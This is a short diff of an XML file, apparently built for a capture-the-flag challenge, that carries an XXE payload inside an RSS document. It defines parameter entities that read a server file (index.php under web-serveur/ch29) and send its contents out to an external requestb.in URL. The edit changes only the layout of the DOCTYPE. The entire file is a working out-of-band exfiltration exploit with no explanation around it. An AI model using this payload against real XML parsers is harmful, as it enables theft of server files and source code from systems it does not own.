@@ -1,7 +1,8 @@
 <?xml version="1.0" encoding="utf-8"?>
-<!DOCTYPE title [ <!ELEMENT title ANY >
+<!DOCTYPE title [ 
 <!ENTITY % payl SYSTEM "file:///web-serveur/ch29/index.php">
-<!ENTITY % intern "<!ENTITY &#37; trick SYSTEM 'http://requestb.in/1c7ii141?%payl;'>">]>
+<!ENTITY % intern "<!ENTITY &#37; trick SYSTEM 'http://requestb.in/1c7ii141?%payl;'>">]
+>
 <rss version="2.0">
 
   <channel>
